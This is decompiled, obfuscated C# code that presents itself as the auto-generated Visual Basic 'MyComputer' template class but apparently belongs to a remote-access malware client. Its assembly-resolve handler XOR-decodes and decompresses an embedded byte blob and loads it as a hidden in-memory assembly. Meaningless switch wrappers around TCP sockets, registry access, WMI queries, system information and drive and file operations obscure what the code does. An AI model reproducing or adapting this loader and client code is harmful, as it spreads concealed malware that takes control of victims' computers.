using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using ns0;

namespace Client.My;

[EditorBrowsable(EditorBrowsableState.Never)]
[GeneratedCode("MyTemplate", "8.0.0.0")]
internal sealed class MyComputer : Computer
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 569)]
	private struct Struct0
	{
	}

	internal sealed class Class0
	{
		internal static void smethod_0<T>(T gparam_0, char char_0, char char_1)
		{
			int num = 0;
			do
			{
				switch (((char_0 ^ char_1) - 50) ^ num)
				{
				case 0:
					Class9.Class10.smethod_0((object)gparam_0, 530, 'Ɍ');
					break;
				}
				num++;
			}
			while ((char_1 * char_1 + char_1) % 2 != 0);
		}

		internal static object smethod_1<T>(T gparam_0, short short_0, short short_1)
		{
			int num = 0;
			object result;
			int num2;
			do
			{
				result = (((short_0 ^ short_1) - 53) ^ num) switch
				{
					0 => Class9.smethod_0((object)gparam_0, '\u030f', (short)831), 
					_ => null, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_2<T>(T gparam_0, char char_0, int int_0) where T : TcpClient
		{
			int num = 0;
			switch (((int_0 ^ char_0) - 106) ^ 0)
			{
			case 0:
				Class9.smethod_1((TcpClient)gparam_0, 'ζ', 938);
				break;
			}
			num++;
		}

		internal static void smethod_3(char char_0, int int_0)
		{
			int num = 0;
			switch (((int_0 ^ char_0) - 26) ^ 0)
			{
			case 0:
				Class9.Class10.smethod_1(478, 506);
				break;
			case 1:
				Class9.Class10.smethod_1(405, 432);
				break;
			case 2:
				Class9.Class10.smethod_1(301, 267);
				break;
			}
			num++;
		}

		internal static bool smethod_4<T>(T gparam_0, int int_0, SelectMode selectMode_0, short short_0, int int_1) where T : Socket
		{
			int num = 0;
			bool result = (((int_1 ^ short_0) - 7) ^ 0) switch
			{
				0 => Class9.smethod_7((Socket)gparam_0, int_0, selectMode_0, 256, (short)356), 
				_ => true, 
			};
			num++;
			return result;
		}

		internal static int smethod_5<T, U>(U gparam_0, T gparam_1, bool bool_0, char char_0, char char_1) where T : string where U : string
		{
			int num = 0;
			int result = (((char_1 ^ char_0) - 33) ^ 0) switch
			{
				0 => Class12.smethod_2((string)gparam_0, (string)gparam_1, bool_0, 849, '\u0350'), 
				_ => 15, 
			};
			num++;
			return result;
		}

		internal static void smethod_6<T>(T gparam_0, short short_0, char char_0) where T : System.Timers.Timer
		{
			int num = 0;
			switch (((char_0 ^ short_0) - 89) ^ 0)
			{
			case 0:
				Class9.Class10.smethod_5((System.Timers.Timer)gparam_0, 672, 'ʴ');
				break;
			}
			num++;
		}

		internal static bool smethod_7<T>(T gparam_0, short short_0, int int_0) where T : string
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((int_0 ^ short_0) - 117) ^ num) switch
				{
					1 => Class9.Class10.smethod_7((string)gparam_0, 89, 'z'), 
					0 => Class9.Class10.smethod_7((string)gparam_0, 189, '\u009f'), 
					_ => false, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static string smethod_8<T>(T gparam_0, short short_0, char char_0) where T : ComputerInfo
		{
			int num = 0;
			string result;
			int num2;
			do
			{
				result = (((char_0 ^ short_0) - 116) ^ num) switch
				{
					1 => (string)(IConvertible)Class12.smethod_6<ComputerInfo>((ComputerInfo)(object)gparam_0, 8, 's'), 
					0 => (string)(IConvertible)Class12.smethod_6<ComputerInfo>((ComputerInfo)(object)gparam_0, 143, 'õ'), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static byte[] smethod_9<T>(T gparam_0, int int_0, char char_0) where T : string
		{
			int num = 0;
			byte[] result;
			do
			{
				result = (((char_0 ^ int_0) - 101) ^ num) switch
				{
					0 => (byte[])(IEnumerable)Class12.smethod_7((string)gparam_0, 683, 'ʰ'), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static ManagementObjectCollection smethod_10<T>(T gparam_0, int int_0, short short_0) where T : ManagementObjectSearcher
		{
			int num = 0;
			ManagementObjectCollection result;
			do
			{
				result = (ManagementObjectCollection)((((short_0 ^ int_0) - 68) ^ num) switch
				{
					0 => (IEnumerable)Class9.Class11.smethod_5<ManagementObjectSearcher>((ManagementObjectSearcher)(object)gparam_0, (short)0, (short)94), 
					_ => null, 
				});
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static byte[] smethod_11<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : Encoding where U : string
		{
			int num = 0;
			byte[] result;
			int num2;
			do
			{
				result = (((short_1 ^ short_0) - 65) ^ num) switch
				{
					0 => (byte[])(ICloneable)Class9.Class11.smethod_7((Encoding)gparam_0, (string)gparam_1, (short)124, 42), 
					_ => null, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static string smethod_12<T>(T gparam_0, char char_0, char char_1) where T : DriveInfo
		{
			int num = 0;
			string result = (((char_0 ^ char_1) - 20) ^ 0) switch
			{
				0 => Class12.smethod_8((DriveInfo)gparam_0, 'Ć', (short)345), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_13<T, U, V>(T gparam_0, V gparam_1, U gparam_2, int int_0, char char_0) where T : FileSystemProxy where U : string where V : string
		{
			int num = 0;
			int num2;
			do
			{
				switch (((int_0 ^ char_0) - 24) ^ num)
				{
				case 0:
					Class9.Class11.smethod_10<string, FileSystemProxy, string>((FileSystemProxy)(object)gparam_0, (string)gparam_1, (string)gparam_2, (short)905, 1006);
					break;
				}
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
		}
	}

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 2300)]
	private struct Struct1
	{
	}

	internal static Struct0 struct0_0/* Not supported: data(4B F4 67 C2 B9 EA B8 D3 15 1E A2 1A 9F 2D 08 8F FF 5B 95 95 D3 D1 F0 B6 F8 69 E4 A3 69 4E 42 63 38 87 6C 04 AC 3C DD DA E9 74 E2 6A 89 09 5F 9D 17 44 CF E4 50 EC 8D 32 BC 1E C2 03 FD C3 30 66 D1 88 1E C7 92 FC C9 23 8A D9 39 37 E6 DE 49 21 B5 48 25 CE 95 1D 31 86 21 43 79 FA B4 71 EF 34 C2 07 E8 19 9D 7D 17 6D 1D 2B 64 E9 25 0D 64 0C 29 EE 76 05 2C 95 70 38 28 8A D9 8C E6 C1 39 FE 05 D0 B0 F2 4E 6D A7 B5 A8 CC 88 0F 5B 13 55 B4 75 5B BF AD 95 ED 74 F6 8B 6F 5B 5A 59 7E 51 37 12 68 48 85 61 61 70 32 B8 FB 8E B4 AF 59 3E B7 FE 45 CF 10 F3 89 EA C9 BA 5C 89 1B 8A 11 CA 2F 71 E7 D6 EF 10 54 4A 6B 94 2C F0 92 EF C4 DB 0E 3C B1 09 A7 61 04 C7 59 41 95 58 AF E8 B2 80 1B D9 BB 3A 05 79 7E E0 E9 23 76 28 7B E1 FE 3D 47 A1 ED 4F 91 DF C6 FF D5 C3 AC 6C E0 AD DE AA AA 03 FF 74 E2 20 36 74 09 7A 1C AD 5B A3 3B 93 B5 C8 45 01 AB 54 EC F5 02 99 C9 43 CC EC 5C FA BB 39 E7 2A 56 BA 6A 79 F8 01 08 46 67 52 4D CF E5 C5 6A 06 B5 DB D6 D7 84 44 6B DC 32 87 37 8A 41 2F 92 8C 77 07 D1 69 41 78 FE BF 6B 66 F1 1E F2 FA FC F6 FF C4 C8 94 67 AA 7C 06 B4 CF C8 BC B3 EE D9 4D AE DA C3 EB 80 92 96 2B 22 2B 20 61 0F 25 C4 2B B0 FB D8 1E DA A9 44 F8 14 F6 F3 AB F3 9E 5D 96 05 74 BA 5F 9C 58 86 98 B5 85 25 81 6B 27 7E DC 0B C3 57 62 65 5C 4F D3 CE 54 D4 90 38 C6 B0 14 2E 8E F7 AA 7E 95 26 2A 93 B1 48 9C EB 1C 0A E4 6F 0D A5 FF 7B A2 97 B1 70 33 30 25 9A 25 FE EA 7A D8 D5 3D 7C CD BD FB E9 6A C3 5C 76 1A AA 16 2D DA AC B5 58 14 DC 63 EA 3A 09 34 38 78 15 43 D2 07 40 7A 77 85 51 AD F0 B7 73 F8 50 23 95 12 7E 5E F6 C2 D2 60 25 1D E3 44 BD D9 DC 15 53 11 00 14 E1 8B 56 42 F8 B6 4F 01 F2 5C 7C 2B 1B 73 9C 2D 2E 95 10 A6 09 C3 5C AD 4A 6C 9C 52 B1 3E 13 D9 8B 38 50 07 C1 20 AE 52 1B 5A 7F B1 20 E3 48 D9 37 DB A3 DD) */;

	private static readonly Array array_0;

	private static readonly Array array_1;

	private static readonly object object_0;

	internal static byte byte_0/* Not supported: data(00) */;

	[EditorBrowsable(EditorBrowsableState.Never)]
	public MyComputer()
	{
	}

	static MyComputer()
	{
		array_1 = new char[1150];
		char[] array = new char[8];
		array[2] = 'Ȿ';
		array[7] = '⇦';
		array[1] = '㖼';
		array[3] = 'ώ';
		array[6] = '㢷';
		array[0] = 'ㄹ';
		array[4] = '⟈';
		array[5] = '㍴';
		object_0 = new string[89];
		array_0 = array;
		Class6.smethod_0();
	}

	internal static Assembly smethod_0(object object_1, ResolveEventArgs resolveEventArgs_0)
	{
		return (Assembly)smethod_1("0b6c5f66-4331-42b2-a0ba-1d6cbb790045", 569, 147, resolveEventArgs_0, typeof(Class4));
	}

	internal static object smethod_1(string string_0, int int_0, int int_1, object object_1, Type type_0)
	{
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected O, but got Unknown
		if (int_0 > 0)
		{
			Assembly gparam_ = Class6.smethod_2(708, 703);
			ResolveEventArgs gparam_2 = (ResolveEventArgs)object_1;
			string gparam_3 = (string)(IEnumerable)Class6.Class7.smethod_0(string_0, "-F3E4", 944, 903);
			AppDomain gparam_4 = Class6.smethod_3(509, 'ǩ');
			Dictionary<string, string> dictionary = (Dictionary<string, string>)smethod_4(gparam_4, string_0, 1000, 973);
			Assembly assembly;
			if (dictionary == null)
			{
				dictionary = new Dictionary<string, string>();
				Class6.smethod_4(gparam_4, string_0, (object)dictionary, (short)815, (short)826);
				byte[] array = new byte[569]
				{
					75, 244, 103, 194, 185, 234, 184, 211, 21, 30,
					162, 26, 159, 45, 8, 143, 255, 91, 149, 149,
					211, 209, 240, 182, 248, 105, 228, 163, 105, 78,
					66, 99, 56, 135, 108, 4, 172, 60, 221, 218,
					233, 116, 226, 106, 137, 9, 95, 157, 23, 68,
					207, 228, 80, 236, 141, 50, 188, 30, 194, 3,
					253, 195, 48, 102, 209, 136, 30, 199, 146, 252,
					201, 35, 138, 217, 57, 55, 230, 222, 73, 33,
					181, 72, 37, 206, 149, 29, 49, 134, 33, 67,
					121, 250, 180, 113, 239, 52, 194, 7, 232, 25,
					157, 125, 23, 109, 29, 43, 100, 233, 37, 13,
					100, 12, 41, 238, 118, 5, 44, 149, 112, 56,
					40, 138, 217, 140, 230, 193, 57, 254, 5, 208,
					176, 242, 78, 109, 167, 181, 168, 204, 136, 15,
					91, 19, 85, 180, 117, 91, 191, 173, 149, 237,
					116, 246, 139, 111, 91, 90, 89, 126, 81, 55,
					18, 104, 72, 133, 97, 97, 112, 50, 184, 251,
					142, 180, 175, 89, 62, 183, 254, 69, 207, 16,
					243, 137, 234, 201, 186, 92, 137, 27, 138, 17,
					202, 47, 113, 231, 214, 239, 16, 84, 74, 107,
					148, 44, 240, 146, 239, 196, 219, 14, 60, 177,
					9, 167, 97, 4, 199, 89, 65, 149, 88, 175,
					232, 178, 128, 27, 217, 187, 58, 5, 121, 126,
					224, 233, 35, 118, 40, 123, 225, 254, 61, 71,
					161, 237, 79, 145, 223, 198, 255, 213, 195, 172,
					108, 224, 173, 222, 170, 170, 3, 255, 116, 226,
					32, 54, 116, 9, 122, 28, 173, 91, 163, 59,
					147, 181, 200, 69, 1, 171, 84, 236, 245, 2,
					153, 201, 67, 204, 236, 92, 250, 187, 57, 231,
					42, 86, 186, 106, 121, 248, 1, 8, 70, 103,
					82, 77, 207, 229, 197, 106, 6, 181, 219, 214,
					215, 132, 68, 107, 220, 50, 135, 55, 138, 65,
					47, 146, 140, 119, 7, 209, 105, 65, 120, 254,
					191, 107, 102, 241, 30, 242, 250, 252, 246, 255,
					196, 200, 148, 103, 170, 124, 6, 180, 207, 200,
					188, 179, 238, 217, 77, 174, 218, 195, 235, 128,
					146, 150, 43, 34, 43, 32, 97, 15, 37, 196,
					43, 176, 251, 216, 30, 218, 169, 68, 248, 20,
					246, 243, 171, 243, 158, 93, 150, 5, 116, 186,
					95, 156, 88, 134, 152, 181, 133, 37, 129, 107,
					39, 126, 220, 11, 195, 87, 98, 101, 92, 79,
					211, 206, 84, 212, 144, 56, 198, 176, 20, 46,
					142, 247, 170, 126, 149, 38, 42, 147, 177, 72,
					156, 235, 28, 10, 228, 111, 13, 165, 255, 123,
					162, 151, 177, 112, 51, 48, 37, 154, 37, 254,
					234, 122, 216, 213, 61, 124, 205, 189, 251, 233,
					106, 195, 92, 118, 26, 170, 22, 45, 218, 172,
					181, 88, 20, 220, 99, 234, 58, 9, 52, 56,
					120, 21, 67, 210, 7, 64, 122, 119, 133, 81,
					173, 240, 183, 115, 248, 80, 35, 149, 18, 126,
					94, 246, 194, 210, 96, 37, 29, 227, 68, 189,
					217, 220, 21, 83, 17, 0, 20, 225, 139, 86,
					66, 248, 182, 79, 1, 242, 92, 124, 43, 27,
					115, 156, 45, 46, 149, 16, 166, 9, 195, 92,
					173, 74, 108, 156, 82, 177, 62, 19, 217, 139,
					56, 80, 7, 193, 32, 174, 82, 27, 90, 127,
					177, 32, 227, 72, 217, 55, 219, 163, 221
				};
				for (int num = int_0 - 1; num >= 0; num--)
				{
					array[num] ^= (byte)((num + int_0 - int_1) & 0xFF);
				}
				Stream stream = new MemoryStream();
				using (Stream gparam_5 = new DeflateStream(new MemoryStream(array), CompressionMode.Decompress, leaveOpen: true))
				{
					byte[] array2 = new byte[1024];
					int int_2;
					while ((int_2 = Attribute0.smethod_2(gparam_5, array2, 0, array2.Length, 'ů', 369)) > 0)
					{
						smethod_6(stream, array2, 0, int_2, 'Ĥ', 260);
					}
				}
				assembly = (Assembly)(_Assembly)Class6.smethod_6(Class6.smethod_5((MemoryStream)stream, 576, 585), null, Class6.Class7.smethod_1(gparam_, 'j', 77), 67, 45);
				Class6.smethod_4(gparam_4, gparam_3, (object)assembly, (short)898, (short)919);
				string[] array3 = Attribute0.smethod_3(assembly, 571, 'ȉ');
				foreach (string text in array3)
				{
					dictionary[text] = text;
				}
			}
			else
			{
				assembly = (Assembly)Class12.Class13.smethod_6(gparam_4, gparam_3, 229, '\u009a');
			}
			if (dictionary.ContainsKey(Class9.Class11.smethod_12(gparam_2, 1009, 1014)))
			{
				return assembly;
			}
		}
		return null;
	}

	internal static Assembly smethod_2<T>(T gparam_0, char char_0, char char_1) where T : Type
	{
		int num = 0;
		Assembly result = (((char_1 ^ char_0) - 31) ^ 0) switch
		{
			0 => Class12.Class13.smethod_7((Type)gparam_0, 179, (short)250), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static bool smethod_3<T>(T gparam_0, short short_0, int int_0) where T : WeakReference
	{
		int num = 0;
		bool result = (((short_0 ^ int_0) - 75) ^ 0) switch
		{
			0 => Class12.Class13.smethod_9((WeakReference)gparam_0, (short)229, (short)164), 
			_ => false, 
		};
		num++;
		return result;
	}

	internal static object smethod_4<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : AppDomain where U : string
	{
		int num = 0;
		object result = (((short_0 ^ short_1) - 37) ^ 0) switch
		{
			0 => Class12.Class13.smethod_6((AppDomain)gparam_0, (string)gparam_1, (short)824, '\u0347'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static Delegate smethod_5<T, U>(T gparam_0, U gparam_1, char char_0, char char_1) where T : Delegate where U : Delegate
	{
		int num = 0;
		Delegate result = (((char_0 ^ char_1) - 34) ^ 0) switch
		{
			0 => Class12.Class13.smethod_11((Delegate)gparam_0, (Delegate)gparam_1, '\u0331', 857), 
			1 => Class12.Class13.smethod_11((Delegate)gparam_0, (Delegate)gparam_1, 'Ɓ', 488), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_6<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, char char_0, short short_0) where T : Stream
	{
		int num = 0;
		do
		{
			switch (((char_0 ^ short_0) - 32) ^ num)
			{
			case 0:
				Class12.Class13.smethod_12((Stream)gparam_0, byte_1, int_0, int_1, '$', 30);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	internal static void smethod_7<T, U>(T gparam_0, U gparam_1, int int_0, int int_1, short short_0) where T : TcpClient where U : string
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ int_1) - 1) ^ num)
			{
			case 0:
				Class9.smethod_17((TcpClient)gparam_0, (string)gparam_1, int_0, 63, 27);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_8<T>(T gparam_0, char char_0, char char_1) where T : Thread
	{
		int num = 0;
		switch (((char_1 ^ char_0) - 125) ^ 0)
		{
		case 0:
			Class12.Class13.smethod_14((Thread)gparam_0, 830, '\u0369');
			break;
		}
		num++;
	}

	internal static void smethod_9<T>(T gparam_0, byte[] byte_1, int int_0, int int_1, int int_2, short short_0) where T : MemoryStream
	{
		int num = 0;
		switch (((int_2 ^ short_0) - 32) ^ 0)
		{
		case 0:
			Class12.smethod_5((MemoryStream)gparam_0, byte_1, int_0, int_1, 273, (short)317);
			break;
		}
		num++;
	}

	internal static long smethod_10<T>(T gparam_0, int int_0, int int_1) where T : MemoryStream
	{
		int num = 0;
		long result = (((int_1 ^ int_0) - 91) ^ 0) switch
		{
			0 => Class9.Class10.smethod_16((MemoryStream)gparam_0, 636, (short)609), 
			_ => 1L, 
		};
		num++;
		return result;
	}

	internal static bool smethod_11<T>(T gparam_0, int int_0, short short_0) where T : Socket
	{
		int num = 0;
		bool result = (((short_0 ^ int_0) - 51) ^ 0) switch
		{
			0 => Class9.smethod_19((Socket)gparam_0, 461, (short)490), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static int smethod_12<T>(T gparam_0, char char_0, int int_0) where T : Socket
	{
		int num = 0;
		int result;
		int num2;
		do
		{
			result = (((int_0 ^ char_0) - 40) ^ num) switch
			{
				0 => Class9.smethod_20((Socket)gparam_0, (short)531, 'ɰ'), 
				_ => int_0, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static RegistryKey smethod_13<T>(T gparam_0, short short_0, int int_0) where T : RegistryProxy
	{
		int num = 0;
		RegistryKey result = (((short_0 ^ int_0) - 56) ^ 0) switch
		{
			0 => (RegistryKey)(IDisposable)Class9.Class11.smethod_17<RegistryProxy>((RegistryProxy)(object)gparam_0, (short)160, '¼'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static RegistryKey smethod_14<T, U>(U gparam_0, T gparam_1, bool bool_0, int int_0, int int_1) where T : string where U : RegistryKey
	{
		int num = 0;
		RegistryKey result = (((int_0 ^ int_1) - 47) ^ 0) switch
		{
			0 => (RegistryKey)(IDisposable)Class9.Class10.smethod_18((RegistryKey)gparam_0, (string)gparam_1, bool_0, 'ï', 161), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_15<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : string where U : string
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ short_0) - 91) ^ num)
			{
			case 0:
				Class12.smethod_14((string)gparam_0, (string)gparam_1, (short)787, '\u030e');
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static ComputerInfo smethod_16<T>(T gparam_0, int int_0, char char_0) where T : ServerComputer
	{
		int num = 0;
		ComputerInfo result;
		int num2;
		do
		{
			result = (ComputerInfo)((((int_0 ^ char_0) - 36) ^ num) switch
			{
				0 => Class12.smethod_15<ServerComputer>((ServerComputer)(object)gparam_0, 68, '5'), 
				_ => null, 
			});
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static char smethod_17<T>(T gparam_0, int int_0, short short_0, int int_1) where T : string
	{
		int num = 0;
		char result;
		int num2;
		do
		{
			result = (((short_0 ^ int_1) - 55) ^ num) switch
			{
				0 => Class9.smethod_21((string)gparam_0, int_0, (short)332, 277), 
				_ => 'g', 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static Encoding smethod_18(char char_0, short short_0)
	{
		int num = 0;
		Encoding result;
		int num2;
		do
		{
			result = (((short_0 ^ char_0) - 44) ^ num) switch
			{
				0 => Class9.Class11.smethod_19(867, 810), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static DriveInfo[] smethod_19(short short_0, char char_0)
	{
		int num = 0;
		DriveInfo[] result;
		do
		{
			result = (((short_0 ^ char_0) - 110) ^ num) switch
			{
				0 => Class9.smethod_22('Ý', '§'), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static DriveType smethod_20<T>(T gparam_0, short short_0, short short_1) where T : DriveInfo
	{
		int num = 0;
		DriveType result = (((short_0 ^ short_1) - 115) ^ 0) switch
		{
			0 => Class12.Class13.smethod_18((DriveInfo)gparam_0, 628, 606), 
			_ => DriveType.Unknown, 
		};
		num++;
		return result;
	}

	internal static FileSystemProxy smethod_21<T>(T gparam_0, char char_0, char char_1) where T : ServerComputer
	{
		int num = 0;
		FileSystemProxy result;
		do
		{
			result = (FileSystemProxy)((((char_0 ^ char_1) - 86) ^ num) switch
			{
				0 => Class12.smethod_18<ServerComputer>((ServerComputer)(object)gparam_0, 70, '\u0010'), 
				_ => null, 
			});
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}
}
